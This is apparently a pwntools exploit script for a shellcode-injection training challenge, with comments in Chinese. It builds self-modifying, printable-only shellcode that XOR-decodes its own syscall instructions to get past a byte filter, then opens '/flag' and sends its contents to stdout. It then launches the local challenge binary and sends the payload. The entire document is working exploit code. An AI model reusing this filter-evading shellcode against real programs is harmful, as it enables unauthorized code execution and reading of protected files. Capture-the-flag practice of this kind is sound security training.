#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")
nop_code = asm("push rbx")  # 填充代码

# 将syscall恢复
shellcode = asm("""
push 0x20
pop rcx
xor byte ptr [rdx+0x52], cl # rdx为代码地址
xor byte ptr [rdx+0x53], cl
xor byte ptr [rdx+0x7d], cl
xor byte ptr [rdx+0x7e], cl
""")

payload = shellcode
payload += nop_code * (0x18 - len(payload)) # 填充到0x18

shellcode = asm("""
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 0x616c662f
    push rax
    push rax
    push rax
    push rax
    push 0x67
    pop rax
    xor byte ptr [rsp+0x24], al
    pop rax
    pop rax
    pop rax
    pop rax
    push rsp    # /flag字符串在栈顶
    pop rdi
    push 0x30
    push rax
    push rax
    push rax
    push rax
    push 0x30
    pop rax
    xor byte ptr [rsp+0x20], al
    pop rax
    pop rax
    pop rax
    pop rax
    pop rsi # rsi=O_RDONLY
    push SYS_open ^ 0x30
    push rax
    push rax
    push rax
    push rax
    push 0x30
    pop rax
    xor byte ptr [rsp+0x20], al
    pop rax
    pop rax
    pop rax
    pop rax
    pop rax # rax=SYS_open 2
    syscall
    /* call sendfile(1, 'rax', 0) */
    push rax
    pop rsi # 文件句柄
    push 1 ^ 0x30
    push rax
    push rax
    push rax
    push rax
    push 0x30
    pop rax
    xor byte ptr [rsp+0x20], al
    pop rax
    pop rax
    pop rax
    pop rax
    pop rdi # rdi=1
    push 0x30
    push rax
    push rax
    push rax
    push rax
    push 0x30
    pop rax
    xor byte ptr [rsp+0x20], al
    pop rax
    pop rax
    pop rax
    pop rax
    pop rdx # rdx=0
    push SYS_sendfile /* 0x28 */
    pop rax
    syscall
""")

payload += shellcode
payload += nop_code * (0x80 - len(payload)) # 填充到0x80

# 编码syscall
payload = bytearray(payload)
payload[0x52] ^= 0x20
payload[0x53] ^= 0x20
payload[0x7d] ^= 0x20
payload[0x7e] ^= 0x20
payload = bytes(payload)

print(payload)
print(len(payload))
# 验证
cnt = 0
for i, d in enumerate(payload):
    if (d < 32 or d > 126):
        cnt += 1
        print(False, hex(i), hex(d))
print(cnt)
# exit()

sh = process("/challenge/shellcode-injection-level3.1")
sh.send(payload)
sh.interactive()
